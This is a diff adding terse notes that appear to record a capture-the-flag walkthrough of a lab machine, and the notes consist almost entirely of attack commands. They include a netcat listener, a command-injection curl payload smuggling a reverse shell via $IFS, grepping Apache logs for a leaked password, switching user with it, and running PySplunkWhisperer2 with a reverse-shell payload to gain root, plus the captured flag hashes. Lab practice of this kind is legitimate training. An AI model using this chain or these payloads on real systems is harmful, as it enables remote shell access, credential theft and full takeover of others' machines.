@@ -1,0 +1,24 @@
+nc -nlvp 1234
+curl http://10.10.14.7:4445/$(nc.traditional$IFS-e/bin/sh$IFS'10.10.14.7'$IFS'1234')
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+
+cd /var/log/apache2
+cat access.log | grep "password"
+
+password:Guitar123
+
+cd /home
+su shaun
+password:Guitar123
+
+cd shaun
+cat user.txt
+eff464a0191ab40bd656c18180eafd8a
+
+nc -nlvp 1234
+python PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.11 --username shaun --password Guitar123 --payload 'nc.traditional -e/bin/sh '10.10.14.11' '1234''
+
+
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+cd /root
+09d0657ec4f4d08c1568bceb4b630d57
